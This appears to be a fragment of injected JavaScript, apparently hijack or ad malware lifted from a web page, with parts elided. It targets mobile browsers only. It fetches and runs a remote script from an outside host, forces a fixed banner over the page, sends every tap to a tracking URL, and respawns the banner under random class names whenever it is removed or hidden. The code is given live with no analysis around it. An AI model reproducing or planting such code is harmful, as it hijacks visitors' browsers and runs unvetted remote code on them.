...
if (!system.win && !system.mac && !system.xll && !regexp.test(where)) {
    ...
    if (direction == 'b' || direction == 'all') {
        ...
        if(randomElement == 'smCpv'){
            window.QkGjFP = function(){var a=document.createElement('a');var evjs=`(function(){var cname='QkGjFP',cn='https://api.simi1234.com/static/image/c.png',bn='https://dingbu.bj.bcebos.com/dibu.adadadad',jp='https://api.simi1234.com/a/c?au5b9262149de3692875cda46c75dc081c=',FSGEeQ=null,cst=0,drv=isCheckD();if(drv){crateEl(cname);var n=0;FSGEeQ=setInterval(()=>{n++;var elobj=resbaner();if(!elobj){cname=its(6);return crateEl('QkGjFP '+cname)}var eh=elobj.getBoundingClientRect().height;if(eh==0){elobj.remove();cname=its(6);crateEl('QkGjFP '+cname)}},500)}var s=document.createElement('script');s.src='https://api.simi1234.com/s/c?_=454983698695426048';document.getElementsByTagName('head')[0].appendChild(s);function crateEl(n){var by=document.body;if(!by){return false};var br=document.createElement('div');br.setAttribute('class',n);var img=document.createElement('img');img.src=bn;var p=document.createElement('span');br.append(p);br.append(img);by.append(br);addlistenerElement(br,function(e){var pX=0,pY=0,touches=e.changedTouches;if(touches){var touchesData=touches[0]; pX=touchesData.pageX; pY=touchesData.pageY};var _ao=document.createElement('a');_ao.href=jp+au5b9262149de3692875cda46c75dc081c+decodeURIComponent('%26')+'cp='+pX+','+pY;_ao.click()});addlistenerElement(p,function(){clearInterval(FSGEeQ);resbaner().remove()});img.onload=function(){var h=this.height;resbaner().style.height=h+'px';getIheight(h,this.width)}}function getStyleStr(el){var obs=window.getComputedStyle(el,'');var str='';for(k in obs){if(parseInt(k).toString()=='NaN'){str+=k+': '+obs[k]+';'+'<br/>'}}return str}var pimg='.QkGjFP img{width:100% !important;}';var ps=cst==4?'':'position:fixed;';var bs='.QkGjFP{z-index:999;'+(cst==2||cst==3?'width:100px;':'')+(cst==3?'right:0;':'left:0;')+ps+(cst==0?'bottom:0px':cst==1?'top:0px':'bottom:50%')+';}'+pimg;if(drv){addStyle(bs)}function getIheight(height,w){var ch='width:18px;height:18px';var ot=(cst==0?'bottom':cst==1?'top':cst==2||cst==3?'bottom':'')+(cst==0||cst==1?':'+height+'px;':cst==2||cst==3?':calc(50% + '+height+'px)':'display:none;');var or=(cst==0||cst==1?'right:0':cst==2?'left:'+(w-18)+'px':'right:'+(w-18)+'px');var close='.QkGjFP span{padding:0 !important;margin:0 !important;'+ch+';background:url('+cn+');background-size:contain;position:fixed;'+or+';'+ot+'}';close+=(cst==1?'body{padding-top:'+height+'px !important;}':'');addStyle(close)}function addStyle(style){var styleObj=document.createElement('style');styleObj.setAttribute('type','text/css');styleObj.innerHTML=style;document.getElementsByTagName('head')[0].appendChild(styleObj)}function resbaner(){return document.querySelector('.'+cname)}function isCheckD(){var p=navigator.platform;var system={win:false,mac:false,Xll:false};system.win=p.indexOf('Win')==0;system.mac=p.indexOf('Mac')==0;system.X11=(p=='X11')||(p.indexOf('Linux')==0);if(system.win||system.mac||system.Xll){return false}return true}function addlistenerElement(el,callBack){el.addEventListener('click',handleFun);el.addEventListener('touchstart',handleFun);function handleFun(e){e.preventDefault();e.stopPropagation();callBack(e)}}function its(len){var r=['a','B','c','d','e','G','g','h','J','j','k'],str='';for(var i=0;i<len;i++){var rx=Math.round(Math.random()*(r.length-1));str+=r[rx]}return str}})();`;a.href='javascript:'+evjs;a.click()};window.QkGjFP();   
        }
    }
